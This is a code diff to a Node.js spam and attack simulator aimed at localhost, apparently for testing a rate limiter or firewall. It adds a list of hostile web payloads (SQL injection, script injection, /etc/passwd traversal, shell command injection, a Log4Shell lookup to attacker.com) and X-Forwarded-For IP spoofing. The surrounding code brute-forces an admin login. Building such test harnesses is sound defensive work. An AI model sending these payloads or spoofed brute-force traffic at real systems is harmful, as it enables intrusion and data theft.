@@ -27,6 +27,26 @@ const referenceWords = [
     'medan', 'cikarang', 'shop', 'order', 'checkout', 'staff', 'merchant', 'admin123'
 ];
 
+const maliciousPayloads = [
+    'union select 1,2,3',
+    '\' OR \'1\'=\'1',
+    '<script>alert(1)</script>',
+    '../../etc/passwd',
+    '; ls -la',
+    '${jndi:ldap://attacker.com/a}'
+];
+
+const generateSimulationPath = (index) => {
+    // 80% chance: clean request to /products
+    if (Math.random() < 0.80) {
+        const word = referenceWords[index % referenceWords.length];
+        return `/products?name=${encodeURIComponent(word)}`;
+    }
+    // 20% chance: malicious attack
+    const payload = maliciousPayloads[index % maliciousPayloads.length];
+    return `/products?name=${encodeURIComponent(payload)}`;
+};
+
 let stats = {
     total: 0,
     blocked429: 0,
@@ -74,6 +94,7 @@ const sendSpam = (ip, count, path, targetPort, callback) => {
         method: 'GET',
         headers: {
             'x-simulated-ip': ip, // spoof client IP
+            'X-Forwarded-For': ip,
             'User-Agent': 'SpamBot/2.0'
         }
     };
@@ -103,7 +124,7 @@ function runSpam(reqsPerIP, ipCount, intervalMs) {
     const ips = defaultSpammers.slice(0, ipCount);
     
     console.log(`\n🚀 Launching Spam Simulation...`);
-    console.log(`- Targeting: http://localhost:8080/`);
+    console.log(`- Targeting: http://localhost:7129/`);
     console.log(`- Request count: ${reqsPerIP} reqs per IP`);
     console.log(`- Unique IPs: ${ips.length}`);
     console.log(`- Interval: ${intervalMs}ms between requests`);
@@ -123,9 +144,8 @@ function runSpam(reqsPerIP, ipCount, intervalMs) {
     ips.forEach((ip) => {
         let sent = 0;
         const interval = setInterval(() => {
-            const pass = generateRandomPassword(sent);
-            const path = `/login?username=admin&password=${encodeURIComponent(pass)}`;
-            sendSpam(ip, sent, path, 8080, onComplete);
+            const path = generateSimulationPath(sent);
+            sendSpam(ip, sent, path, 7129, onComplete);
             sent++;
             if (sent % 20 === 0) {
                 console.log(`[${ip}] Sent ${sent}/${reqsPerIP} requests...`);
@@ -173,10 +193,9 @@ function runRandomizedSpamCycle(totalSpam, reqsPerIP, intervalMs) {
         console.log(`-> Commencing Brute Force Attack with ${botLimit} wordlist attempts...`);
 
         const interval = setInterval(() => {
-            const pass = generateRandomPassword(totalSent);
-            const path = `/login?username=admin&password=${encodeURIComponent(pass)}`;
+            const path = generateSimulationPath(totalSent);
             
-            sendSpam(botIP, botSent, path, 8080, onComplete);
+            sendSpam(botIP, botSent, path, 7129, onComplete);
             botSent++;
             totalSent++;
 
@@ -214,7 +233,7 @@ function showMenu() {
     console.log(`
     ███████╗██████╗  █████╗ ███╗   ███╗
     ██╔════╝██╔══██╗██╔══██╗████╗  ████║
-    ███████╗██████╔╝███████║██╔████╔██║  PORT: 8080
+    ███████╗██████╔╝███████║██╔████╔██║  PORT: 7129
     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║  
     ███████║██║     ██║  ██║██║ ╚═╝ ██║  
     ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
